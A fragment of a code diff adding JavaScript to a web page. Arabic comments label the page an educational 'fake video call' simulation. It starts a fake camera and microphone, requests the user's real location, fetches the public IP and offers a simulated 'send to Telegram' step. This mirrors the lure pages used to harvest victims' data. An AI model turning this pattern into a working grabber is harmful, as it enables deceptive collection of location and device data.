+            tracks.forEach(track => track.stop());
+            fakeVideo.srcObject = null;
+        }
+        videoContainer.style.display = 'none';
+    }
+    
+    // بدء "المكالمة الوهمية"
+    async function startCallSimulation() {
+        stopAllSimulations();
+        addLog('🔴 بدء محاكاة "مكالمة الفيديو" التعليمية...', 'info');
+        statusDiv.innerHTML = '📞 جاري الاتصال... (محاكاة)';
+        
+        // 1. محاكاة الكاميرا
+        await startFakeCamera();
+        
+        // 2. محاكاة الميكروفون
+        startFakeMic();
+        
+        // 3. طلب الموقع (بإذن المستخدم)
+        await getRealLocation();
+        
+        // 4. جلب IP وعرضه
+        await getPublicIP();
+        
+        // 5. نهاية المحاكاة - إشعار ببدء المكالمة الوهمية
+        setTimeout(() => {
+            addLog('✅ اكتملت محاكاة المكالمة! (تم عرض جميع الصلاحيات المطلوبة)', 'success');
+            statusDiv.innerHTML = '🎬 وضع "مكالمة الفيديو" الوهمي - كل ما يظهر هو محاكاة محلية فقط';
+        }, 1000);
+    }
+    
+    // أزرار
+    startBtn.addEventListener('click', startCallSimulation);
+    simulateSendBtn.addEventListener('click', () => {
+        addLog('🔘 تم الضغط على "محاكاة الإرسال إلى تيليجرام"', 'info');
+        simulateTelegramSend();
+    });
+    
+    addLog('🚀 الصفحة جاهزة - جميع الخيارات واضحة وتطلب موافقة المستخدم', 'success');
+    addLog('📌 ملاحظة تعليمية: هذا الكود لا يرسل أي بيانات حقيقية لأي خادم طرف ثالث', 'info');
 </script>
 </body>
 </html>
